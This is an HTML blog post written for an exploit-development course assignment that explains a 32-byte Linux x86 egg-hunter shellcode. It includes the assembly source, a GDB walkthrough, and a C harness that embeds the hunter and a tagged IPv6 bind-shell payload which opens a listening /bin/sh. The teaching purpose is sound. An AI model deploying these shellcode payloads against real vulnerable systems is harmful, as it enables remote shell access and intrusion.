<!DOCTYPE html>
<html lang="en">

<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
<link rel="stylesheet" href="/assets/css/style.css">
<title>SHELLCODE_EGG_HUNTER – LINUX/X86</title>
<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>SHELLCODE_EGG_HUNTER – LINUX/X86 | IAMROOT</title>
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="SHELLCODE_EGG_HUNTER – LINUX/X86" />
<meta name="author" content="Kartik Durg" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification Student ID: SLAE-1233 Assignment: 3 Github: Kartik Durg" />
<meta property="og:description" content="This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification Student ID: SLAE-1233 Assignment: 3 Github: Kartik Durg" />
<link rel="canonical" href="http://localhost:4000/2018/09/13/0x3-shellcode-egg-hunter-linux-x86.html" />
<meta property="og:url" content="http://localhost:4000/2018/09/13/0x3-shellcode-egg-hunter-linux-x86.html" />
<meta property="og:site_name" content="IAMROOT" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2018-09-13T00:00:00+05:30" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2018/09/13/0x3-shellcode-egg-hunter-linux-x86.html"},"author":{"@type":"Person","name":"Kartik Durg"},"description":"This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification Student ID: SLAE-1233 Assignment: 3 Github: Kartik Durg","headline":"SHELLCODE_EGG_HUNTER – LINUX/X86","dateModified":"2018-09-13T00:00:00+05:30","datePublished":"2018-09-13T00:00:00+05:30","@type":"BlogPosting","url":"http://localhost:4000/2018/09/13/0x3-shellcode-egg-hunter-linux-x86.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


<head>

</head></head>

<body>
  <main class="container">
    <section class="about">
      <a href="/"><img src="/assets/portfolio.jpg" alt="Kartik Durg"></a>
      <h2 id="title">
        <a href="/">Kartik Durg</a>
      </h2>
      <p class="tagline">Red Team Research @McAfee</p>
      <ul class="social"><a href="https://github.com/kartikdurg" target="_blank">
          <li>
            <i class="icon-github-circled"></i>
          </li>
        </a><a href="https://www.linkedin.com/in/kartikdurg" target="_blank">
          <li>
            <i class="icon-linkedin-squared"></i>
          </li>
        </a><a href="https://twitter.com/kartikdurg" target="_blank">
          <li>
            <i class="icon-twitter-squared"></i>
          </li>
        </a></ul><nav class="navigation">
        <ul>
          
          <li>
            <a href="/index.html">Home</a>
          </li>
          
        </ul>
      </nav><p>&copy;
        2020</p><div>
        <p>Dark Mode
          <i class="icon-moon"></i>
          <label class="switch">
            <input type="checkbox" id="dark-mode-toggle">
            <span class="slider round" onclick="toggleDarkMode()"></span>
          </label>
        </p>
      </div>
      <script type="text/javascript" src="/assets/js/darkmode.js"></script></section>
    <section class="content">
      <div class="post-container">
  <a class="post-link" href="/2018/09/13/0x3-shellcode-egg-hunter-linux-x86.html">
    <h2 class="post-title">SHELLCODE_EGG_HUNTER – LINUX/X86</h2>
  </a>
  <div class="post-meta">
    <div class="post-date"><i class="icon-calendar"></i>Sep 13, 2018</div></div>
  <div class="post">
    <p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification</p>
<ul>
  <li>Student ID: SLAE-1233</li>
  <li>Assignment: 3</li>
  <li>Github: <a href="https://github.com/kartikdurg">Kartik Durg</a></li>
</ul>

<hr />

<h4 id="what-is-an-egg-hunter">WHAT IS AN EGG-HUNTER?</h4>
<p>The “Egg-Hunter” is a technique used to search for an unique “tag” that was prefixed with the large shellcode and start the execution of shellcode once found.</p>

<h4 id="why-do-we-need-egg-hunter">WHY DO WE NEED EGG-HUNTER?</h4>
<p>For example, let us assume that you have found a buffer-overflow vulnerability and there is no enough memory space for our bind/reverse shellcode. To solve this problem a unique “tag” is prefixed with our shellcode and then execute “Egg Hunter” shellcode  that is small in size, fast and robust at the same time, this “Egg-Hunter” will search our unique “tag” and starts the execution of large shellcode(bind/reverse) once found.</p>

<p>In this post I will be implementing the “sigaction(2)” approach as discussed by Skape in the <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Safely Searching Process Virtual Address Space</a> research paper.</p>

<p>The “sigaction(2)” prototype is as follows:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);
</code></pre></div></div>

<p>The EAX register should hold the system call number of “sigaction” as defined below:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define __NR_sigaction 67 [0x43]
</code></pre></div></div>

<p>The goal here is to use the structure of act being in the ECX register for validating the region of memory.</p>

<p>Now let’s jump into the implementation which is as follows:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>global _start
section .text

_start:
xor ecx, ecx             ;zero out ecx

page_allign: 
xor cx, 0x0fff           ;Page allignment

valid_add: 
inc ecx                  ;increment the pointer to try next valid address
push 0x43                ;push syscall 67 | sigaction
pop eax                  ;EAX=0x43
int 0x80                 ;call sigaction() for validation

efault_cmpsn:
cmp al, 0xf2             ;Low-byte of EAX compared against 0xf2|EFAULT
jz page_allign           ;If ZF set JMP back to "page_allign"

search_tag:
mov eax, 0x4a424f59      ;move the "tag" to EAX register| 0x4a424f59 = JBOY
mov edi, ecx             ;move ECX to EDI
scasd                    ;Compare contents of EDI to the dword value in EAX and increment
jnz valid_add            ;Not equal? then go back to valid_add
scasd                    ;Compare contents of EDI to the dword value in EAX and increment
jnz valid_add            ;Not equal? then go back to valid_add
jmp edi                  ;TAG found ==&gt; Execute the shellcode I'm pointing to
</code></pre></div></div>

<p>To understand this concept, let’s analyze the complete shellcode below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt; 
#include &lt;string.h&gt; 

#define JBOY "\x59\x4f\x42\x4a"

//Egg-Hunter shellcode
unsigned char egg_hunter[] = "\x31\xc9\x66\x81\xf1\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x59\x4f\x42\x4a\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

//Bind shell(IPv6)
unsigned char egg[] = JBOY JBOY
"\x6a\x66\x58\x31\xdb\x6a\x06\x6a\x01\x6a\x0a\x43\x89\xe1\xcd\x80\x96\x31\xc0\x50\x50\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x53\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x99\x52\x52\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x93\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

int main() 
{ 
printf("Egg is at %p\n", egg); 
printf("Egghunter size: %d\n", strlen(egg_hunter)); 
int (*ret)() = (int(*)())egg_hunter; 
ret(); 
}
</code></pre></div></div>

<p>The above shellcode will execute bind shell once the “tag”(JBOY) is identified by our egg-hunter shellcode.</p>

<p>Let’s run the shellcode using GDB and setup a break point at “main” and “egg_hunter”:</p>

<p><img src="/media/3-egg-hunter-1.jpg" alt="" /></p>

<p>Now that we have reached the breakpoint which points to our “Egg-Hunter” shellcode, let us also define a “hook-stop” to examine EAX, ECX and EDI registers every time the execution stops.</p>

<p><img src="/media/3-egg-hunter-2.jpg" alt="" /></p>

<p>After the first XOR instruction, the next two instruction performs page alignment operation by XORing “0xfff” on lower 16-bits of ECX and then incrementing ECX by one.  As noticed in the screenshot below, this operation is equivalent to adding “0x1000” to ECX register.</p>

<p><img src="/media/3-egg-hunter-3.jpg" alt="" /></p>

<p>After the page alignment operation, the lower 16-bit of EAX register is initialized to 0x43[67] which is a system call number of “sigaction” and once the system call is executed it’s return value is then compared with 0xf2 which represents the lower byte of EFAULT. If the lower byte of EAX is equal to 0xf2 the implementation again jumps back to XOR “0xfff” on lower 16-bits of ECX as seen below:</p>

<p><img src="/media/3-egg-hunter-4.jpg" alt="" /></p>

<p>Implementation when lower byte of EAX is “not-equal” to 0xf2:</p>

<p><img src="/media/3-egg-hunter-5.jpg" alt="" /></p>

<p>The value of valid pointer is stored in EDI register after moving the “tag” to EAX register. Next, the scasd instruction compares the contents of memory stored in EDI to the DWORD value in EAX(unique tag).</p>

<p>Instead of stepping through each and every instruction let’s setup a breakpoint on second scasd instruction and continue the execution.</p>

<p><img src="/media/3-egg-hunter-6.jpg" alt="" /></p>

<p>Now that the scasd instruction has been executed twice, the value of EDI will be 8-bytes apart pointing at our shellcode(bind/reverse or any other) as seen below:</p>

<p><img src="/media/3-egg-hunter-7.jpg" alt="" /></p>

<p>Execution of large payload (bind shell):</p>

<p><img src="/media/3-egg-hunter-8.jpg" alt="" /></p>

<hr />

<h3 id="proof-of-concept">PROOF OF CONCEPT:</h3>

<p><img src="/media/3-egg-hunter-9.jpg" alt="" /></p>

<p>The size of “Egg-hunter” shellcode is just 32-bytes when compared to the original size of  bind shell which is 100-bytes, thus allowing us to execute larger payload when the available memory space is less than payload.</p>

<hr />

<p>Link to shellcode.c: <a href="https://github.com/kartikdurg/SLAE/blob/master/Assignment_0x3/egg_hunter.c">egg_hunter.c</a></p>

<p>Link to shellcode.asm: <a href="https://github.com/kartikdurg/SLAE/blob/master/Assignment_0x3/egg_hunter.asm">egg_hunter.asm</a></p>

<p>Thank you for reading 🙂</p>

<p>– Kartik Durg</p>

  </div><div id="disqus_thread" style="margin-top:25px"></div>
  <script>
    var disqus_config = function () {
      this.page.url = 'http://localhost:4000/2018/09/13/0x3-shellcode-egg-hunter-linux-x86.html';
      this.page.identifier = 'http://localhost:4000/2018/09/13/0x3-shellcode-egg-hunter-linux-x86.html';
    };
    (function () {
      var d = document, s = d.createElement('script');
      s.src = 'https://redteam.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments
      powered by Disqus.</a></noscript></div>

    </section>
  </main><script async src="https://www.googletagmanager.com/gtag/js?id=UA-176694116-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag() { dataLayer.push(arguments); }
    gtag('js', new Date());
    gtag('config', 'UA-176694116-1');
  </script>
  <script src="/assets/js/simple-jekyll-search.min.js"></script>
  <script src="/assets/js/search.js"></script>
  
</body>

</html>
